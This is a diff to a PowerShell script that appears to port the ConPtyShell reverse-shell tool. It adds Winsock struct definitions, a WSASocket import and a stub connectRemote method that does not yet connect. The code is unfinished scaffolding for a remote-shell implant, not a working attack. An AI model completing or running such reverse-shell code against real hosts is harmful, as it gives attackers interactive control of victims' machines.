@@ -803,6 +803,40 @@ $global:WSAData_TYPE = struct $Mod WSAData @{
     szSystemStatus = field 6 String -MarshalAs @('ByValTStr', 129)
 }
 
+$GUID = struct $Mod GUID @{
+    Data1 = field 0 Int32
+    Data2 = field 1 Uint16
+    Data3 = field 2 Uint16
+    Data4 = field 3 byte[] -MarshalAs @('ByValArray', 8)
+}
+
+$WSAPROTOCOLCHAIN = struct $Mod WSAPROTOCOLCHAIN @{
+    ChainLen = field 0 Int32
+    ChainEntries = field 1 UInt32[] -MarshalAs @('ByValArray', 7)
+}
+
+$global:WSAPROTOCOL_INFO_TYPE = struct $Mod WSAPROTOCOL_INFO @{
+    dwServiceFlags1 =   field 0 UInt32
+    dwServiceFlags2 =   field 1 UInt32
+    dwServiceFlags3 =   field 2 UInt32
+    dwServiceFlags4 =   field 3 UInt32
+    dwProviderFlags =   field 4 UInt32
+    ProviderId =        field 5 $GUID
+    dwCatalogEntryId =  field 6 uint32
+    ProtocolChain =     field 7 $WSAPROTOCOLCHAIN
+    iVersion =          field 8 Int32
+    iAddressFamily =    field 9 Int32
+    iMaxSockAddr =      field 10 Int32
+    iMinSockAddr =      field 11 Int32
+    iSocketType =       field 12 Int32
+    iProtocol =         field 13 Int32
+    iProtocolMaxOffset= field 14 Int32
+    iNetworkByteOrder = field 15 Int32
+    iSecurityScheme =   field 16 Int32
+    dwMessageSize =     field 17 UInt32
+    dwProviderReserved= field 18 UInt32
+    szProtocol =        field 19 String -MarshalAs @('ByValTStr', 256)
+}
 
 $FunctionDefinitions = @(
     (func kernel32 SetStdHandle ([IntPtr]) @([Int32], [IntPtr])),  
@@ -811,6 +845,14 @@ $FunctionDefinitions = @(
     (func kernel32 CreateFile ([IntPtr]) @([String], [UInt32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr])),
     (func kernel32 GetModuleHandle ([IntPtr]) @([String]) -SetLastError),
     (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
+    (func ws2_32 WSASocket ([IntPtr]) @(
+        [Int32], # AddressFamily
+        [Int32], # SocketType
+        [Int32], # ProtocolType
+        [IntPtr], # ProtocolInfo
+        [UInt32], # Group
+        [Int32]  # Flags
+    )  -Charset Ansi -SetLastError),
     # private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
     (func ws2_32 WSAGetLastError ([Int32])),
     (func ws2_32 WSAStartup ([Int32]) @([Int16], $global:WSAData_TYPE.MakeByRefType()))
@@ -856,6 +898,17 @@ class ConPtyShell {
         }
     }
 
+    hidden static [IntPtr] connectRemote([string] $remoteIp, [UInt32] $remotePort) {
+        [int] $port = 0
+        [int] $error = 0
+        [string] $host = $remoteIp
+
+        [IntPtr] $socket = [IntPtr]::Zero
+
+
+
+        return 0x42
+    }
 
     hidden static [void] CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite) {
         $Kernel32 = $global:Kernel32
@@ -925,10 +978,21 @@ class ConPtyShell {
 
         # comment the below function to debug errors
         [ConPtyShell]::InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr)
-
         # init wsastartup stuff for this thread
         [ConPtyShell]::InitWSAThread();
 
+        # TODO Write CreatePseudoConsle part
+        if ($false) { #$conptyCompatible) {
+            Write-Host "CreatePseudoConsole function found! Spawning a fully interactive shell" -ForegroundColor Green
+        } else {
+
+            if ($upgradeShell) {
+                Write-Host "Could not upgrade shell to fully interactive because ConPTY is not compatible on this system" -ForegroundColor Red
+                return ""
+            }
+            
+            $shellSocket = [ConPtyShell]::connectRemote($remoteIp, $remotePort)
+        }
 
 
         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
